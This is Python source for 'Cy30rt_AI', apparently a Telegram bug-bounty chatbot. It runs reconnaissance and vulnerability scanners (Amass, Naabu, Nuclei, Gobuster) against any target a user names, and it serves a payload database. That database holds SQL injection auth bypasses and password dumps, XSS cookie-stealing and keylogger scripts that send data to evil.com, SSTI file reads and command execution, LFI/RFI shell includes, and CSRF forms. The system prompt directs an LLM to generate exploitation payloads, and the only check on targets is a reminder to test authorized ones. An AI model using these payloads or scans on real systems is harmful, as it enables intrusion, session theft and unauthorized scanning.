import os
import httpx
import subprocess
import json
import re
from groq import AsyncGroq
from typing import AsyncGenerator, Dict, List, Any

# API Keys
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

class Cy30rtAI:
    """Professional Cybersecurity AI with Multi-Tool Bug Bounty Integration"""
    
    def __init__(self):
        self.groq_client = AsyncGroq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
        
        self.system_prompt = """You are Cy30rt_AI, a professional cybersecurity and bug bounty assistant created by Abdulbasid Yakubu (cy30rt).

CAPABILITIES:
- Run multiple reconnaissance tools (Amass, Subfinder, Assetfinder, Naabu, Nuclei, WhatWeb, Gobuster)
- Execute complete full recon workflows
- Analyze aggregated findings from all tools
- Generate exploitation payloads
- Provide step-by-step guidance

IMPORTANT RULES:
- ALWAYS remind users to ONLY test authorized targets
- NEVER encourage illegal hacking
- Provide complete, detailed responses
- End responses with: "Stay secure. - Cy30rt_AI"""

    # ============ MULTI-TOOL RECONNAISSANCE INTEGRATION ============
    
    async def run_tool(self, tool_name: str, args: List[str], timeout: int = 120) -> str:
        """Execute a tool and capture output"""
        try:
            tool_paths = {
                "amass": "amass",
                "subfinder": "subfinder",
                "assetfinder": "assetfinder",
                "httpx": "httpx",
                "naabu": "naabu",
                "gobuster": "gobuster",
                "nuclei": "nuclei",
                "whatweb": "whatweb",
                "reconix": "reconix"
            }
            
            cmd = tool_paths.get(tool_name, tool_name).split() + args
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return f"Timeout: {tool_name} took longer than {timeout} seconds"
        except FileNotFoundError:
            return f"Tool not found: {tool_name} is not installed"
        except Exception as e:
            return f"Error running {tool_name}: {str(e)}"
    
    async def discover_subdomains(self, target: str) -> List[str]:
        """Combine multiple subdomain discovery tools"""
        subdomains = set()
        
        # Amass
        amass_result = await self.run_tool("amass", ["enum", "-d", target, "-silent"])
        for line in amass_result.split('\n'):
            if line.strip() and '.' in line:
                subdomains.add(line.strip())
        
        # Subfinder
        subfinder_result = await self.run_tool("subfinder", ["-d", target, "-silent"])
        for line in subfinder_result.split('\n'):
            if line.strip() and '.' in line:
                subdomains.add(line.strip())
        
        # Assetfinder
        assetfinder_result = await self.run_tool("assetfinder", [target])
        for line in assetfinder_result.split('\n'):
            if line.strip() and '.' in line:
                subdomains.add(line.strip())
        
        # Reconix subdomain extraction
        reconix_result = await self.run_tool("reconix", [target])
        for line in reconix_result.split('\n'):
            if '[SUBDOMAIN]' in line:
                sub = line.replace('[SUBDOMAIN]', '').strip()
                if sub:
                    subdomains.add(sub)
        
        return list(subdomains)
    
    async def scan_ports(self, target: str) -> List[Dict]:
        """Scan for open ports using Naabu"""
        ports_found = []
        
        naabu_result = await self.run_tool("naabu", ["-host", target, "-silent", "-timeout", "500"])
        
        for line in naabu_result.split('\n'):
            if ':' in line:
                parts = line.split(':')
                port = parts[-1].strip()
                ports_found.append({
                    "port": port,
                    "service": "unknown",
                    "tool": "naabu"
                })
        
        return ports_found
    
    async def detect_technologies(self, target: str) -> List[Dict]:
        """Detect web technologies using WhatWeb and Reconix"""
        technologies = []
        
        # WhatWeb detection
        whatweb_result = await self.run_tool("whatweb", ["--quiet", "--no-errors", target])
        if '[' in whatweb_result and ']' in whatweb_result:
            content = whatweb_result.split('[')[1].split(']')[0]
            techs = [t.strip() for t in content.split(',')]
            for tech in techs[:15]:
                technologies.append({"name": tech, "source": "whatweb", "confidence": "high"})
        
        # Reconix technology detection
        reconix_result = await self.run_tool("reconix", [target])
        for line in reconix_result.split('\n'):
            if '[TECH]' in line:
                tech = line.replace('[TECH]', '').strip()
                if tech and not any(t['name'] == tech for t in technologies):
                    technologies.append({"name": tech, "source": "reconix", "confidence": "medium"})
        
        return technologies
    
    async def scan_vulnerabilities(self, target: str) -> List[Dict]:
        """Run Nuclei vulnerability scanning"""
        vulnerabilities = []
        
        nuclei_result = await self.run_tool("nuclei", [
            "-u", target,
            "-severity", "critical,high,medium",
            "-silent",
            "-json"
        ], timeout=180)
        
        for line in nuclei_result.split('\n'):
            if line.strip():
                try:
                    data = json.loads(line)
                    vulnerabilities.append({
                        "name": data.get("info", {}).get("name", "Unknown"),
                        "severity": data.get("info", {}).get("severity", "info"),
                        "url": data.get("host", ""),
                        "matched_at": data.get("matched-at", ""),
                        "source": "nuclei"
                    })
                except:
                    pass
        
        return vulnerabilities
    
    async def run_directory_bruteforce(self, target: str) -> List[str]:
        """Run Gobuster for directory enumeration"""
        directories = []
        
        gobuster_result = await self.run_tool("gobuster", [
            "dir", "-u", target, 
            "-w", "/usr/share/wordlists/dirb/common.txt", 
            "-q", "-s", "200,301,302,403"
        ], timeout=120)
        
        for line in gobuster_result.split('\n'):
            if any(code in line for code in ['200', '301', '302', '403']):
                parts = line.split()
                if len(parts) >= 2:
                    directories.append(parts[1])
        
        return directories
    
    async def run_full_recon(self, target: str) -> Dict[str, Any]:
        """Complete reconnaissance pipeline with all tools"""
        
        results = {
            "target": target,
            "subdomains": [],
            "ports": [],
            "technologies": [],
            "vulnerabilities": [],
            "directories": []
        }
        
        # Phase 1: Subdomain Discovery (Parallel)
        results["subdomains"] = await self.discover_subdomains(target)
        
        # Phase 2: Port Scanning
        results["ports"] = await self.scan_ports(target)
        
        # Phase 3: Technology Detection
        results["technologies"] = await self.detect_technologies(target)
        
        # Phase 4: Vulnerability Scanning
        results["vulnerabilities"] = await self.scan_vulnerabilities(target)
        
        # Phase 5: Directory Bruteforce
        results["directories"] = await self.run_directory_bruteforce(target)
        
        return results
    
    # ============ INDIVIDUAL TOOL COMMANDS ============
    
    async def cmd_amass(self, target: str) -> str:
        output = await self.run_tool("amass", ["enum", "-d", target])
        return f"🔍 **Amass Subdomain Enumeration - {target}**\n\n```\n{output[:2000]}\n```"
    
    async def cmd_subfinder(self, target: str) -> str:
        output = await self.run_tool("subfinder", ["-d", target, "-silent"])
        return f"🔍 **Subfinder Results - {target}**\n\n```\n{output[:1500]}\n```"
    
    async def cmd_naabu(self, target: str) -> str:
        output = await self.run_tool("naabu", ["-host", target, "-silent"])
        return f"🔌 **Open Ports - {target}**\n\n```\n{output[:1000]}\n```"
    
    async def cmd_whatweb(self, target: str) -> str:
        output = await self.run_tool("whatweb", [target])
        return f"🌐 **Technology Detection - {target}**\n\n```\n{output[:1500]}\n```"
    
    async def cmd_nuclei(self, target: str) -> str:
        output = await self.run_tool("nuclei", ["-u", target, "-severity", "critical,high,medium", "-silent"])
        return f"⚠️ **Nuclei Vulnerability Scan - {target}**\n\n```\n{output[:2000]}\n```"
    
    async def cmd_gobuster(self, target: str) -> str:
        output = await self.run_tool("gobuster", ["dir", "-u", target, "-w", "/usr/share/wordlists/dirb/common.txt", "-q"])
        return f"📁 **Directory Bruteforce - {target}**\n\n```\n{output[:1500]}\n```"
    
    # ============ PAYLOAD DATABASE ============
    
    async def get_payloads(self, vuln_type: str) -> str:
        payloads = {
            "sqli": """💉 **SQL Injection Payloads**

**Authentication Bypass:**
' OR '1'='1' --
admin' --
' OR 1=1--

**Union-Based:**
' UNION SELECT null, username, password FROM users--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT @@version, user(), database()--

**Time-Based:**
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

**Error-Based:**
' AND extractvalue(1, concat(0x7e, version()))--
' AND updatexml(1, concat(0x7e, version()), 1)--""",
            
            "xss": """🔓 **XSS Payloads**

**Basic Alert:**
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

**Cookie Stealing:**
<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

**Keylogger:**
<script>document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}</script>

**Blind XSS:**
<script>document.location='https://evil.com/xss?c='+document.cookie</script>""",
            
            "ssti": """🧠 **SSTI Payloads**

**Jinja2 (Python):**
{{7*7}}
{{config}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

**Twig (PHP):**
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

**Freemarker (Java):**
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

**Smarty (PHP):**
{$smarty.version}
{php}echo system('id');{/php}""",
            
            "lfi": """📂 **LFI/RFI Payloads**

**Basic LFI:**
../../../../etc/passwd
../../../etc/passwd%00
..\..\..\windows\win.ini

**PHP Wrappers:**
php://filter/convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=config.php
php://input

**Log Poisoning:**
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../var/log/auth.log

**RFI:**
http://evil.com/shell.txt
http://evil.com/shell.txt?cmd=id""",
            
            "csrf": """🔄 **CSRF PoC Generator**

**GET Request CSRF:**
<img src="https://target.com/change-email?email=hacker@evil.com">

**POST Request CSRF:**
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>

**JSON CSRF:**
<script>
fetch('https://target.com/api/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'hacker@evil.com'})
});
</script>"""
        }
        
        return payloads.get(vuln_type, f"Payload type '{vuln_type}' not found. Available: sqli, xss, ssti, lfi, csrf")
    
    # ============ CVE LOOKUP ============
    
    async def lookup_cve(self, cve_id: str) -> str:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"https://cve.circl.lu/api/cve/{cve_id}")
                if response.status_code == 200:
                    data = response.json()
                    return f"""🔍 **{cve_id} Information**

**Summary:** {data.get('summary', 'No summary available')[:500]}

**CVSS Score:** {data.get('cvss', 'N/A')}

**Published:** {data.get('Published', 'N/A')}
**Modified:** {data.get('Modified', 'N/A')}

**References:**
{chr(10).join([f"  • {ref[:80]}" for ref in data.get('references', [])[:5]])}

**Remediation:** Check vendor advisory for patches."""
                else:
                    return f"CVE {cve_id} not found. Check the ID format (e.g., CVE-2024-6387)"
        except Exception as e:
            return f"Error looking up CVE: {str(e)}"
    
    # ============ TEACHING MODULES ============
    
    async def teach_topic(self, topic: str) -> str:
        lessons = {
            "sqli": """📚 **SQL Injection Lesson**

**What is SQL Injection?**
SQL injection occurs when user input is inserted directly into SQL queries without sanitization.

**How it works:**
Normal query: SELECT * FROM users WHERE username='admin' AND password='pass'
Malicious input: admin' --
Result: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'

**Types of SQLi:**
1. In-band SQLi (Error-based, Union-based)
2. Blind SQLi (Boolean-based, Time-based)
3. Out-of-band SQLi

**Test payloads:** /payload sqli

**Practice:** Use /recon to find targets (with permission!)""",
            
            "xss": """📚 **XSS Lesson**

**What is Cross-Site Scripting?**
Injecting malicious JavaScript into web pages.

**Types:**
1. Reflected XSS - Input reflected immediately
2. Stored XSS - Saved in database
3. DOM-based XSS - Client-side JavaScript

**Test payloads:** /payload xss

**Impact:**
• Cookie theft
• Session hijacking
• Keylogging
• Defacement""",
            
            "recon": """📚 **Reconnaissance Methodology**

**Phase 1 - Passive Recon:**
• /amass target.com - Subdomain enumeration
• /subfinder target.com - Passive subdomain discovery

**Phase 2 - Active Recon:**
• /naabu target.com - Port scanning
• /whatweb target.com - Technology detection

**Phase 3 - Vulnerability Scanning:**
• /nuclei target.com - CVE and misconfiguration scanning
• /gobuster target.com - Directory brute force

**Phase 4 - Full Workflow:**
• /fullrecon target.com - Run everything automatically"""
        }
        
        return lessons.get(topic, f"Topic '{topic}' not found. Available: sqli, xss, recon")
    
    # ============ RESULT FORMATTER ============
    
    def format_recon_results(self, results: Dict) -> str:
        """Format results for Telegram/Mini App display"""
        report = f"✅ **FULL RECON COMPLETE - {results['target']}**\n\n"
        report += f"📊 **Summary**\n"
        report += f"• Subdomains found: {len(results['subdomains'])}\n"
        report += f"• Open ports: {len(results['ports'])}\n"
        report += f"• Technologies: {len(results['technologies'])}\n"
        report += f"• Vulnerabilities: {len(results['vulnerabilities'])}\n"
        report += f"• Directories: {len(results['directories'])}\n\n"
        
        if results['subdomains']:
            report += f"🔹 **Subdomains (first 20):**\n"
            for sub in results['subdomains'][:20]:
                report += f"  • {sub}\n"
            report += f"\n"
        
        if results['technologies']:
            report += f"🔹 **Technologies Detected:**\n"
            for tech in results['technologies'][:10]:
                report += f"  • {tech.get('name', 'Unknown')}\n"
            report += f"\n"
        
        if results['vulnerabilities']:
            report += f"⚠️ **Vulnerabilities Found:**\n"
            for vuln in results['vulnerabilities'][:10]:
                report += f"  • [{vuln.get('severity', 'info').upper()}] {vuln.get('name', 'Unknown')[:60]}\n"
            report += f"\n"
        
        if results['directories']:
            report += f"📁 **Interesting Directories:**\n"
            for d in results['directories'][:10]:
                report += f"  • {d}\n"
            report += f"\n"
        
        report += f"💡 **Next Steps:**\n"
        report += f"• /payload sqli - Get SQL injection payloads\n"
        report += f"• /nuclei {results['target']} - Detailed vulnerability scan\n"
        report += f"• Ask me to analyze specific findings\n\n"
        report += f"⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
        
        return report
    
    # ============ MAIN CHAT ROUTER ============
    
    async def chat(self, message: str, language: str = "en") -> AsyncGenerator[str, None]:
        """Main chat endpoint - routes to appropriate function"""
        
        msg_lower = message.lower().strip()
        
        # ============ MULTI-TOOL RECON COMMANDS ============
        
        if msg_lower.startswith("/fullrecon"):
            target = msg_lower.replace("/fullrecon", "").strip()
            if target:
                yield f"🔍 **Starting FULL reconnaissance on {target}**\n\nRunning: Amass, Subfinder, Assetfinder, Naabu, WhatWeb, Nuclei, Gobuster\n\n⏳ This will take 3-5 minutes...\n📊 Results will appear here automatically.\n\nStay secure. - Cy30rt_AI"
                
                try:
                    results = await self.run_full_recon(target)
                    formatted = self.format_recon_results(results)
                    for line in formatted.split('\n'):
                        yield line + '\n'
                except Exception as e:
                    yield f"❌ Error: {str(e)}\n\nTry using /recon {target} for a faster scan."
                return
            else:
                yield "📋 **Usage:** /fullrecon <target>\n\nExample: /fullrecon scanme.nmap.org"
                return
        
        if msg_lower.startswith("/amass"):
            target = msg_lower.replace("/amass", "").strip()
            if target:
                result = await self.cmd_amass(target)
                yield result
                return
            else:
                yield "📋 **Usage:** /amass <target>\n\nExample: /amass scanme.nmap.org"
                return
        
        if msg_lower.startswith("/subfinder"):
            target = msg_lower.replace("/subfinder", "").strip()
            if target:
                result = await self.cmd_subfinder(target)
                yield result
                return
            else:
                yield "📋 **Usage:** /subfinder <target>\n\nExample: /subfinder scanme.nmap.org"
                return
        
        if msg_lower.startswith("/naabu") or msg_lower.startswith("/portscan"):
            target = msg_lower.replace("/naabu", "").replace("/portscan", "").strip()
            if target:
                result = await self.cmd_naabu(target)
                yield result
                return
            else:
                yield "📋 **Usage:** /naabu <target>\n\nExample: /naabu scanme.nmap.org"
                return
        
        if msg_lower.startswith("/whatweb"):
            target = msg_lower.replace("/whatweb", "").strip()
            if target:
                result = await self.cmd_whatweb(target)
                yield result
                return
            else:
                yield "📋 **Usage:** /whatweb <target>\n\nExample: /whatweb scanme.nmap.org"
                return
        
        if msg_lower.startswith("/nuclei"):
            target = msg_lower.replace("/nuclei", "").strip()
            if target:
                yield f"🔍 **Starting Nuclei vulnerability scan on {target}**\n\n⏳ This will take 1-2 minutes...\n\nStay secure. - Cy30rt_AI"
                result = await self.cmd_nuclei(target)
                yield result
                return
            else:
                yield "📋 **Usage:** /nuclei <target>\n\nExample: /nuclei scanme.nmap.org"
                return
        
        if msg_lower.startswith("/gobuster"):
            target = msg_lower.replace("/gobuster", "").strip()
            if target:
                yield f"🔍 **Starting directory brute force on {target}**\n\n⏳ Searching for hidden directories...\n\nStay secure. - Cy30rt_AI"
                result = await self.cmd_gobuster(target)
                yield result
                return
            else:
                yield "📋 **Usage:** /gobuster <target>\n\nExample: /gobuster https://scanme.nmap.org"
                return
        
        # ============ RECONIX (Original) ============
        
        if msg_lower.startswith("/recon"):
            target = msg_lower.replace("/recon", "").strip()
            if target:
                yield f"🔍 **Starting reconnaissance on {target}**\n\n⏳ This will take 1-2 minutes...\n📊 Results will appear here automatically.\n\nStay secure. - Cy30rt_AI"
                
                try:
                    cmd = ["reconix", target, "--deep", "--threads=10"]
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    output = result.stdout + result.stderr
                    
                    results = f"✅ **Recon Complete - {target}**\n\n```\n{output[:3500]}\n```\n\n⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
                    yield results
                except Exception as e:
                    yield f"❌ Error: {str(e)}\n\nPlease ensure Reconix is installed."
                return
            else:
                yield "📋 **Usage:** /recon <target>\n\nExample: /recon scanme.nmap.org"
                return
        
        # ============ PAYLOAD COMMANDS ============
        
        if msg_lower.startswith("/payload"):
            vuln_type = msg_lower.replace("/payload", "").strip()
            if vuln_type:
                result = await self.get_payloads(vuln_type)
                yield result
                return
            else:
                yield "📋 **Usage:** /payload <type>\n\nAvailable: sqli, xss, ssti, lfi, csrf\n\nExample: /payload sqli"
                return
        
        # ============ CVE COMMANDS ============
        
        if msg_lower.startswith("/cve"):
            cve_id = msg_lower.replace("/cve", "").strip().upper()
            if cve_id:
                if not cve_id.startswith("CVE-"):
                    cve_id = f"CVE-{cve_id}"
                result = await self.lookup_cve(cve_id)
                yield result
                return
            else:
                yield "📋 **Usage:** /cve CVE-YYYY-XXXX\n\nExample: /cve CVE-2024-6387"
                return
        
        # ============ LEARNING COMMANDS ============
        
        if msg_lower.startswith("/learn"):
            topic = msg_lower.replace("/learn", "").strip()
            if topic:
                result = await self.teach_topic(topic)
                yield result
                return
            else:
                yield "📋 **Usage:** /learn <topic>\n\nAvailable: sqli, xss, recon\n\nExample: /learn sqli"
                return
        
        # ============ HELP COMMAND ============
        
        if msg_lower in ["/help", "/commands"]:
            help_text = """🤖 **Cy30rt_AI Complete Commands**

🔍 **MULTI-TOOL RECONNAISSANCE:**
/fullrecon <target> - Complete workflow (Amass+Subfinder+Naabu+WhatWeb+Nuclei+Gobuster)
/amass <target> - Subdomain enumeration
/subfinder <target> - Passive subdomain discovery
/naabu <target> - Port scanning
/whatweb <target> - Technology detection
/nuclei <target> - Vulnerability scanning
/gobuster <target> - Directory brute force
/recon <target> - Fast Reconix scan

💉 **PAYLOADS:**
/payload sqli - SQL injection payloads
/payload xss - XSS payloads
/payload ssti - SSTI payloads
/payload lfi - LFI/RFI payloads
/payload csrf - CSRF examples

📋 **INTELLIGENCE:**
/cve <id> - Look up CVE information

📚 **LEARNING:**
/learn sqli - SQL injection tutorial
/learn xss - XSS tutorial
/learn recon - Recon methodology

💬 **GENERAL:**
/help - Show this help
/who - About the creator

⚠️ Always test only on authorized targets!

Stay secure. - Cy30rt_AI"""
            yield help_text
            return
        
        if msg_lower in ["/who", "/creator", "/about"]:
            who_text = """🤖 **Cy30rt_AI**

I am a professional cybersecurity and bug bounty assistant created by **Abdulbasid Yakubu (cy30rt)** , a cybersecurity professional.

**Multi-Tool Capabilities:**
• Amass, Subfinder, Assetfinder - Subdomain discovery
• Naabu - Port scanning
• WhatWeb - Technology fingerprinting
• Nuclei - Vulnerability scanning (9,000+ templates)
• Gobuster - Directory brute force
• Reconix - All-in-one reconnaissance

**Other Features:**
• Generate attack payloads (SQLi, XSS, SSTI, LFI, CSRF)
• Look up CVE information
• Teach cybersecurity concepts
• 15 languages support
• Voice interaction

⚠️ Always practice on authorized systems only!

Stay secure. - Cy30rt_AI"""
            yield who_text
            return
        
        # ============ GENERAL AI QUESTIONS ============
        
        if self.groq_client:
            try:
                stream = await self.groq_client.chat.completions.create(
                    model="llama-3.1-8b-instant",
                    messages=[
                        {"role": "system", "content": self.system_prompt},
                        {"role": "user", "content": message}
                    ],
                    temperature=0.7,
                    max_tokens=1500,
                    stream=True
                )
                
                async for chunk in stream:
                    if chunk.choices[0].delta.content:
                        yield chunk.choices[0].delta.content
                return
            except Exception as e:
                yield f"Error: {str(e)}"
        else:
            yield "I'm Cy30rt_AI, your cybersecurity assistant. Type /help to see available commands!"

# Singleton instance
cy30rt_ai = Cy30rtAI()
